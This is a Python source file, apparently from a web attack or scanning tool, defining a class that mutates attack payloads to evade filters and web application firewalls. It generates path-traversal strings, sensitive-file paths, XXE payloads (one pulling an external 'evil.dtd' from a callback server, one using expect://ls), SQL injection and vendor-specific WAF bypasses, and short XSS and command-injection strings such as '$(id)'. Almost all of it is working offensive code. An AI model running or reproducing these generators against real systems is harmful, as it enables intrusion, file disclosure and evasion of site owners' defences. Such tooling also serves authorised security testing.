"""
Payload Mutator

This module provides payload mutation capabilities to generate variations
of base payloads including:
- Case variations (upper, lower, mixed)
- Encoding variations (URL, double URL, Unicode, hex)
- Extension mutations (.bak, .old, .tmp, etc.)
- Path variations (with/without leading slash, backslashes, etc.)
- Null byte injection variants
- Comment-based bypass variations
"""

import urllib.parse
import logging
import re
from typing import List, Set, Dict, Any, Optional
import html as html_module

logger = logging.getLogger(__name__)


class PayloadMutator:
    """
    Generate variations of payloads to bypass filters and increase success rates.
    """
    
    # Common backup file extensions
    BACKUP_EXTENSIONS = [
        '.bak',
        '.backup',
        '.old',
        '.tmp',
        '.save',
        '.swp',
        '.orig',
        '~',
        '.1',
        '.2',
        '_backup',
        '_old',
        '.copy',
    ]
    
    # Common configuration file extensions
    CONFIG_EXTENSIONS = [
        '',
        '.php',
        '.inc',
        '.conf',
        '.config',
        '.ini',
        '.xml',
        '.json',
        '.yaml',
        '.yml',
    ]
    
    @staticmethod
    def scale_payloads_to_minimum(base_payloads: List[str], minimum: int = 1000) -> List[str]:
        """
        Scale a payload list to a minimum count by generating encoding variants.

        Applies URL encoding, double URL encoding, HTML entity encoding, plus
        encoding, and full percent-encoding variants to reach the desired minimum.

        Args:
            base_payloads: Initial list of payload strings
            minimum: Target minimum number of unique payloads (default 1000)

        Returns:
            Deduplicated list of payloads with length >= minimum (if achievable)
        """
        result: Set[str] = set(base_payloads)

        if len(result) >= minimum:
            return list(result)

        def _url_encode(p: str) -> str:
            return urllib.parse.quote(p, safe='')

        def _double_url_encode(p: str) -> str:
            return urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')

        def _html_entity_encode(p: str) -> str:
            return html_module.escape(p, quote=True)

        def _plus_encode(p: str) -> str:
            return urllib.parse.quote_plus(p)

        def _full_percent_encode(p: str) -> str:
            return ''.join(f'%{ord(c):02x}' for c in p)

        def _comment_spaces(p: str) -> str:
            return p.replace(' ', '/**/')

        def _tab_spaces(p: str) -> str:
            return p.replace(' ', '\t')

        def _newline_spaces(p: str) -> str:
            return p.replace(' ', '\n')

        def _upper(p: str) -> str:
            return p.upper()

        def _lower(p: str) -> str:
            return p.lower()

        variant_fns = [
            _url_encode,
            _double_url_encode,
            _html_entity_encode,
            _plus_encode,
            _full_percent_encode,
            _comment_spaces,
            _tab_spaces,
            _newline_spaces,
            _upper,
            _lower,
        ]

        for variant_fn in variant_fns:
            if len(result) >= minimum:
                break
            for payload in list(base_payloads):
                try:
                    variant = variant_fn(payload)
                    if variant and variant != payload:
                        result.add(variant)
                except Exception:
                    pass
                if len(result) >= minimum:
                    break

        return list(result)

    @staticmethod
    def generate_case_variations(payload: str) -> List[str]:
        """
        Generate case variations of a payload.
        
        Args:
            payload: Base payload string
            
        Returns:
            List of case-varied payloads
        """
        variations = [
            payload,
            payload.lower(),
            payload.upper(),
        ]
        
        # Title case for paths
        if '/' in payload or '\\' in payload:
            variations.append(payload.title())
        
        return list(set(variations))
    
    @staticmethod
    def generate_encoding_variations(payload: str) -> List[str]:
        """
        Generate encoded variations of a payload.
        
        Args:
            payload: Base payload string
            
        Returns:
            List of encoded payloads
        """
        variations = [payload]
        
        try:
            # URL encoding
            variations.append(urllib.parse.quote(payload))
            
            # Double URL encoding
            variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Plus encoding (spaces to +)
            variations.append(urllib.parse.quote_plus(payload))
            
            # Partial encoding (encode only special chars)
            partial = payload.replace('/', '%2f').replace('\\', '%5c')
            variations.append(partial)
            
            # Mixed case encoding
            mixed_encoded = payload.replace('/', '%2F').replace('\\', '%5C')
            variations.append(mixed_encoded)
            
        except Exception as e:
            logger.debug(f"Error generating encoding variations: {e}")
        
        return list(set(variations))
    
    @staticmethod
    def generate_path_variations(file_path: str) -> List[str]:
        """
        Generate path variations for file inclusion/disclosure attacks.
        
        Args:
            file_path: Base file path
            
        Returns:
            List of path variations
        """
        variations = [file_path]
        
        # Remove leading slashes
        if file_path.startswith('/'):
            variations.append(file_path[1:])
        elif file_path.startswith('\\'):
            variations.append(file_path[1:])
        else:
            # Add leading slashes if not present
            variations.append('/' + file_path)
            variations.append('\\' + file_path)
        
        # Convert between forward and back slashes
        variations.append(file_path.replace('/', '\\'))
        variations.append(file_path.replace('\\', '/'))
        
        # Dot-slash variations
        variations.append('./' + file_path.lstrip('/').lstrip('\\'))
        variations.append('.\\' + file_path.lstrip('/').lstrip('\\'))
        
        # Null byte injection (may work on older systems)
        variations.append(file_path + '%00')
        variations.append(file_path + '\x00')
        
        return list(set(variations))
    
    @staticmethod
    def generate_extension_variations(file_path: str, extensions: List[str] = None) -> List[str]:
        """
        Generate file extension variations.
        
        Args:
            file_path: Base file path
            extensions: List of extensions to try (default: backup extensions)
            
        Returns:
            List of file paths with different extensions
        """
        if extensions is None:
            extensions = PayloadMutator.BACKUP_EXTENSIONS
        
        variations = [file_path]
        
        # Add extensions
        for ext in extensions:
            variations.append(file_path + ext)
        
        # Replace existing extension
        if '.' in file_path:
            base = file_path.rsplit('.', 1)[0]
            for ext in extensions:
                if ext.startswith('.'):
                    variations.append(base + ext)
        
        return list(set(variations))
    
    @staticmethod
    def generate_sensitive_file_variations(base_path: str) -> List[str]:
        """
        Generate variations of sensitive file paths commonly found in info disclosure.
        
        Args:
            base_path: Base file path (e.g., 'config.php')
            
        Returns:
            List of variations
        """
        variations = []
        
        # Original path
        variations.append(base_path)
        
        # Add leading paths if not present
        if not base_path.startswith('/') and not base_path.startswith('\\'):
            variations.append('/' + base_path)
            variations.append('./' + base_path)
        
        # Common locations
        common_dirs = [
            '',
            '/',
            '/var/www/html/',
            '/var/www/',
            '/usr/share/',
            '/etc/',
            '/home/',
            '/opt/',
            'C:\\',
            'C:\\inetpub\\wwwroot\\',
            'C:\\xampp\\htdocs\\',
        ]
        
        for dir_path in common_dirs:
            full_path = dir_path + base_path.lstrip('/').lstrip('\\')
            variations.append(full_path)
        
        # Add backup extensions
        for var in list(variations):
            for ext in PayloadMutator.BACKUP_EXTENSIONS[:5]:  # Top 5 most common
                variations.append(var + ext)
        
        # Case variations for path components
        if '/' in base_path or '\\' in base_path:
            variations.extend(PayloadMutator.generate_case_variations(base_path))
        
        return list(set(variations))
    
    @staticmethod
    def generate_traversal_variations(file_path: str, max_depth: int = 8) -> List[str]:
        """
        Generate path traversal variations.
        
        Args:
            file_path: Target file path
            max_depth: Maximum traversal depth
            
        Returns:
            List of traversal payloads
        """
        # Remove leading slashes for traversal
        clean_path = file_path.lstrip('/').lstrip('\\')
        
        variations = []
        
        # Basic traversal depths
        for depth in range(1, max_depth + 1):
            variations.append('../' * depth + clean_path)
            variations.append('..\\' * depth + clean_path)
        
        # Encoded traversal
        for depth in range(2, 6):  # Focus on common depths
            variations.append('%2e%2e/' * depth + clean_path)
            variations.append('..%2f' * depth + clean_path)
            variations.append('%2e%2e%2f' * depth + clean_path)
        
        # Double encoding
        for depth in range(2, 4):
            variations.append('%252e%252e/' * depth + clean_path)
            variations.append('..%252f' * depth + clean_path)
        
        # Bypass attempts
        variations.append('....//....//....//..../' + clean_path)
        variations.append('....\\\\....\\\\....\\\\....\\' + clean_path)
        
        return list(set(variations))
    
    @staticmethod
    def mutate_payload_list(base_payloads: List[str], 
                           mutation_types: List[str] = None) -> List[str]:
        """
        Apply multiple mutation types to a list of payloads.
        
        Args:
            base_payloads: List of base payloads
            mutation_types: Types of mutations to apply
                          Options: 'case', 'encoding', 'path', 'extension', 'traversal'
                          Default: ['case', 'encoding']
            
        Returns:
            List of mutated payloads (deduplicated)
        """
        if mutation_types is None:
            mutation_types = ['case', 'encoding']
        
        all_mutations: Set[str] = set(base_payloads)
        
        for payload in base_payloads:
            if 'case' in mutation_types:
                all_mutations.update(PayloadMutator.generate_case_variations(payload))
            
            if 'encoding' in mutation_types:
                all_mutations.update(PayloadMutator.generate_encoding_variations(payload))
            
            if 'path' in mutation_types:
                all_mutations.update(PayloadMutator.generate_path_variations(payload))
            
            if 'extension' in mutation_types:
                all_mutations.update(PayloadMutator.generate_extension_variations(payload))
            
            if 'traversal' in mutation_types and ('/' in payload or '\\' in payload):
                all_mutations.update(PayloadMutator.generate_traversal_variations(payload))
        
        return list(all_mutations)
    
    @staticmethod
    def generate_xxe_entity_variations(file_path: str, callback_server: str = None) -> List[str]:
        """
        Generate XXE payload variations for different entity types.
        
        Args:
            file_path: File to extract via XXE
            callback_server: Optional callback server for OOB attacks
            
        Returns:
            List of XXE payloads
        """
        payloads = []
        
        # Basic file read
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>
<root>&xxe;</root>''')
        
        # PHP wrapper (base64)
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<root>&xxe;</root>''')
        
        # Expect wrapper
        payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]>
<root>&xxe;</root>''')
        
        # Parameter entity
        if callback_server:
            payloads.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&send;</root>''')
        
        # UTF-7 encoding bypass
        payloads.append(f'''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file://{file_path}+ACI-+AD4-+AF0-
+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-''')
        
        return payloads
    
    @staticmethod
    def generate_sqli_bypass_variations(base_payload: str) -> List[str]:
        """
        Generate SQL injection bypass variations.
        
        Args:
            base_payload: Base SQLi payload
            
        Returns:
            List of bypass variations
        """
        variations = [base_payload]
        
        # Comment variations
        variations.append(base_payload.replace('--', '#'))
        variations.append(base_payload.replace('--', '/*'))
        variations.append(base_payload + '-- -')
        
        # Space bypass
        space_replacements = ['/**/','%09','%0a','%0b','%0c','%0d','%20','+']
        for replacement in space_replacements[:3]:  # Top 3
            variations.append(base_payload.replace(' ', replacement))
        
        # Case variations for keywords
        if 'union' in base_payload.lower():
            variations.append(base_payload.replace('UNION', 'UnIoN'))
            variations.append(base_payload.replace('UNION', 'uNiOn'))
        
        if 'select' in base_payload.lower():
            variations.append(base_payload.replace('SELECT', 'SeLeCt'))
            variations.append(base_payload.replace('SELECT', 'sElEcT'))
        
        return list(set(variations))

    @staticmethod
    def mutate_for_waf_bypass(payload: str, waf_type: Optional[str] = None) -> List[str]:
        """
        Generate WAF-specific bypass variants for the given payload.

        Args:
            payload:  Base payload to mutate.
            waf_type: Optional WAF vendor hint ('cloudflare', 'mod_security',
                      'imperva', 'akamai', etc.).  When provided, additional
                      vendor-specific bypasses are included.

        Returns:
            List of WAF-bypass payload variants (deduplicated).
        """
        variants: Set[str] = {payload}

        # Universal WAF bypass techniques
        # 1. Comment-based whitespace replacement
        variants.add(payload.replace(' ', '/**/'))
        variants.add(payload.replace(' ', '%09'))   # Tab
        variants.add(payload.replace(' ', '%0a'))   # Newline
        variants.add(payload.replace(' ', '%0d%0a'))

        # 2. Case mixing
        variants.add(payload.upper())
        variants.add(payload.lower())
        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        variants.add(mixed)

        # 3. URL encoding variants
        try:
            variants.add(urllib.parse.quote(payload, safe=''))
            variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
        except Exception:
            pass

        # 4. Null-byte variants
        variants.add(payload + '%00')
        variants.add(payload + '\x00')

        # 5. HTTP parameter pollution hint (add a junk prefix/suffix)
        variants.add(payload + '&foo=bar')
        variants.add('foo=bar&' + payload)

        # Vendor-specific extras
        if waf_type:
            wt = waf_type.lower()
            if 'cloudflare' in wt:
                # Cloudflare tends to block on keyword patterns; use Unicode look-alikes
                variants.add(payload.replace('<', '\uff1c').replace('>', '\uff1e'))
            elif 'mod_security' in wt or 'modsecurity' in wt:
                # ModSecurity: try chunked-comment splits
                variants.add(re.sub(r'([a-zA-Z]{4,})', lambda m: m.group(0)[:2] + '/**/' + m.group(0)[2:], payload))
            elif 'imperva' in wt or 'incapsula' in wt:
                variants.add(payload + ';--')

        return list(variants)

    @staticmethod
    def mutate_for_filter_evasion(payload: str, filtered_patterns: List[str]) -> List[str]:
        """
        Generate variants of *payload* that avoid the specific filtered strings.

        Args:
            payload:           Base payload.
            filtered_patterns: List of string patterns that are known to be
                               filtered/blocked by the target.

        Returns:
            List of mutated payloads that try to avoid the filtered strings.
        """
        variants: Set[str] = {payload}
        current = payload

        for pattern in filtered_patterns:
            if not pattern or pattern not in current:
                continue
            pat_lower = pattern.lower()

            # Strategy 1: comment-split the filtered token
            for i in range(1, len(pattern)):
                split = pattern[:i] + '/**/' + pattern[i:]
                variants.add(current.replace(pattern, split))

            # Strategy 2: HTML entity encode the filtered chars
            encoded = ''.join(f'&#x{ord(c):02x};' for c in pattern)
            variants.add(current.replace(pattern, encoded))

            # Strategy 3: URL-encode the filtered string
            try:
                url_enc = urllib.parse.quote(pattern, safe='')
                variants.add(current.replace(pattern, url_enc))
                double_enc = urllib.parse.quote(url_enc, safe='')
                variants.add(current.replace(pattern, double_enc))
            except Exception:
                pass

            # Strategy 4: Case variation of the token
            if pat_lower != pattern and pat_lower.isalpha():
                variants.add(current.replace(pattern, pattern.swapcase()))

            # Strategy 5: Insert null byte inside the token
            null_split = pattern[:len(pattern) // 2] + '%00' + pattern[len(pattern) // 2:]
            variants.add(current.replace(pattern, null_split))

        return list(variants)

    @staticmethod
    def mutate_for_encoding_bypass(payload: str, encoding_type_stripped: str) -> List[str]:
        """
        Generate payloads using alternative encodings when a particular encoding
        scheme has been stripped by the target.

        Args:
            payload:               Base payload.
            encoding_type_stripped: The encoding type that was stripped.
                                   Supported values: 'url', 'double_url',
                                   'html_entity', 'base64', 'unicode'.

        Returns:
            List of alternatively-encoded payloads.
        """
        variants: Set[str] = {payload}

        enc = (encoding_type_stripped or '').lower().replace('-', '_').replace(' ', '_')

        if enc in ('url', 'percent'):
            # URL encoding stripped → try double-URL, HTML entity, unicode escape
            try:
                variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
            except Exception:
                pass
            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
            variants.add(''.join(f'\\u{ord(c):04x}' for c in payload))

        elif enc in ('double_url', 'double_percent'):
            # Double-URL stripped → try HTML entity, full hex, unicode
            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))
            variants.add(''.join(f'%{ord(c):02x}' for c in payload))

        elif enc in ('html_entity', 'html', 'entity'):
            # HTML entities stripped → try URL, JavaScript hex, unicode
            try:
                variants.add(urllib.parse.quote(payload, safe=''))
            except Exception:
                pass
            variants.add(''.join(f'\\x{ord(c):02x}' for c in payload))
            variants.add(''.join(f'\\u{ord(c):04x}' for c in payload))

        elif enc == 'unicode':
            # Unicode stripped → try URL encoding and base64 via eval
            try:
                variants.add(urllib.parse.quote(payload, safe=''))
            except Exception:
                pass
            import base64 as _b64
            try:
                b64 = _b64.b64encode(payload.encode()).decode()
                variants.add(f'eval(atob("{b64}"))')
            except Exception:
                pass

        elif enc == 'base64':
            # Base64 stripped → try URL and HTML entity
            try:
                variants.add(urllib.parse.quote(payload, safe=''))
            except Exception:
                pass
            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))

        else:
            # Unknown — apply all encodings
            try:
                variants.add(urllib.parse.quote(payload, safe=''))
                variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
            except Exception:
                pass
            variants.add(''.join(f'&#x{ord(c):02x};' for c in payload))

        return list(variants)

    @staticmethod
    def mutate_for_length_constraint(payload: str, max_length: int) -> List[str]:
        """
        Generate shorter equivalent payloads that fit within *max_length* characters.

        The method attempts progressively more aggressive shortening strategies
        while trying to preserve the payload's core effect.

        Args:
            payload:    Base payload (may be longer than max_length).
            max_length: Maximum allowed payload length in characters.

        Returns:
            List of shortened payload variants, all <= max_length characters
            (or an empty list if none could be produced).
        """
        if max_length <= 0:
            return []

        variants: List[str] = []

        # Already fits?
        if len(payload) <= max_length:
            variants.append(payload)
            return variants

        # Strategy 1: Simple truncation
        truncated = payload[:max_length]
        if truncated:
            variants.append(truncated)

        # Strategy 2: Remove optional comments/whitespace
        compact = re.sub(r'/\*.*?\*/', '', payload, flags=re.DOTALL)
        compact = re.sub(r'\s+', ' ', compact).strip()
        if len(compact) <= max_length:
            variants.append(compact)

        # Strategy 3: Well-known short equivalents for common payload types
        short_equiv: Dict[str, List[str]] = {
            'alert': ['alert(1)', 'alert`1`'],
            'script': ['<script>alert(1)', '<svg/onload=alert(1)>'],
            'onerror': ['<img src=x onerror=alert(1)>'],
            'UNION': ["' UNION SELECT NULL--", "1 UNION SELECT NULL--"],
            'etc/passwd': ['../etc/passwd', '../../etc/passwd'],
            'system': [';id', '`id`', '$(id)'],
        }
        for trigger, shorts in short_equiv.items():
            if trigger.lower() in payload.lower():
                for s in shorts:
                    if len(s) <= max_length:
                        variants.append(s)

        # Deduplicate and return only those that fit
        seen: Set[str] = set()
        result: List[str] = []
        for v in variants:
            if v and v not in seen and len(v) <= max_length:
                seen.add(v)
                result.append(v)

        return result
